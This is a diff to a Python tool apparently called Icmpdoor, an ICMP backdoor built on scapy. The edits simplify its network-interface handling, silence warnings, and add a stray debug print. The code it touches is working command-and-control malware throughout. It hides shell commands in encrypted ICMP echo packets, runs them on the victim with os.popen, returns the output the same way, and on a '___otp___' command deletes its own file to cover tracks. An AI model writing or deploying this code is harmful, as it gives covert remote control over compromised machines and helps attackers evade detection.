@@ -5,6 +5,9 @@ import base64
 import os
 import sys
 import time
+import warnings
+from cryptography.utils import CryptographyDeprecationWarning
+warnings.filterwarnings('ignore', category = CryptographyDeprecationWarning)
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -60,14 +63,17 @@ class Icmpdoor():
                     ipkt = self.OTP.decrypt(pkt[Raw].load).decode('utf-8', errors = 'ignore')
                 else:
                     ipkt =pkt[Raw].load.decode('utf-8', errors = 'ignore')
+
                 if ipkt == '___otp___':
                     if os.path.basename(__file__) == 'otp.py':
+                        print('HERE')
                         os.remove('otp.py')
                     sys.exit(0)
                 else:
                     payload = os.popen(ipkt).readlines()
-            except Exception as E:
+            except:
                 return False
+
             try:
                 if self.args.plaintext is False:
                     OTP = self.OTP.encrypt('___42___'.join(payload).encode('utf-8'))
@@ -76,10 +82,7 @@ class Icmpdoor():
                 icmppacket = (IP(dst = pkt[IP].src, ttl = self.TTL)/\
                               ICMP(type = 0, id = self.ICMP_ID, seq = self.seqCounter)/\
                               Raw(load = OTP))
-                if self.args.interface is None:
-                    sr(icmppacket, timeout = 0, verbose = 0)
-                else:
-                    sr(icmppacket, iface = self.args.interface, timeout = 0, verbose = 0)
+                sr(icmppacket, iface = self.args.interface, timeout = 0, verbose = 0)
                 self.seqCounter += 1
             except:
                 return False
@@ -108,17 +111,11 @@ class Icmpdoor():
 
     def serverSniff(self):
         """Sniff for the return output from the client"""
-        if args.interface is None:
-            sniff(prn = self.svr,
-                  lfilter = self.LFILTER,
-                  filter = 'icmp',
-                  store = 0)
-        else:
-            sniff(iface = args.interface,
-                  prn = self.svr,
-                  lfilter = self.LFILTER,
-                  filter = 'icmp',
-                  store = 0)
+        sniff(iface = args.interface,
+              prn = self.svr,
+              lfilter = self.LFILTER,
+              filter = 'icmp',
+              store = 0)
 
 if __name__ == '__main__':
 
@@ -158,17 +155,11 @@ if __name__ == '__main__':
             LFILTER = idr.LFILTER((idr.destination_ip, 8))
             PRN = idr.clientShell()
             print("[+]ICMP listener starting!")
-            if args.interface is None:
-                sniff(prn = PRN,
-                      lfilter = LFILTER,
-                      filter = 'icmp',
-                      store = 0)
-            else:
-                sniff(iface = args.interface,
-                      prn = PRN,
-                      lfilter = LFILTER,
-                      filter = 'icmp',
-                      store = 0)
+            sniff(iface = args.interface,
+                  prn = PRN,
+                  lfilter = LFILTER,
+                  filter = 'icmp',
+                  store = 0)
 
         ## Server mode
         else:
@@ -186,18 +177,16 @@ if __name__ == '__main__':
                     pass
                 else:
                     if args.plaintext is False:
-                        payload = (IP(dst = idr.destination_ip, ttl = idr.TTL)/\
-                                   ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
-                                   Raw(load = idr.OTP.encrypt(icmpshell.encode())))
+                        OTP = idr.OTP.encrypt(icmpshell.encode())
                     else:
-                        payload = (IP(dst = idr.destination_ip, ttl = idr.TTL)/\
-                                   ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
-                                   Raw(load = icmpshell.encode()))
-                    if args.interface is None:
-                        sr(payload, timeout = 0, verbose = 0)
-                    else:
-                        sr(payload, iface = args.interface, timeout = 0, verbose = 0)
+                        OTP = icmpshell.encode()
+                    payload = (IP(dst = idr.destination_ip, ttl = idr.TTL)/\
+                               ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
+                               Raw(load = OTP))
+                    sr(payload, iface = args.interface, timeout = 0, verbose = 0)
                     idr.seqCounter += 1
+
+                ## Break the shell
                 if icmpshell == '___otp___':
                     print("[+]Deleting ICMP C2...")
                     time.sleep(2)
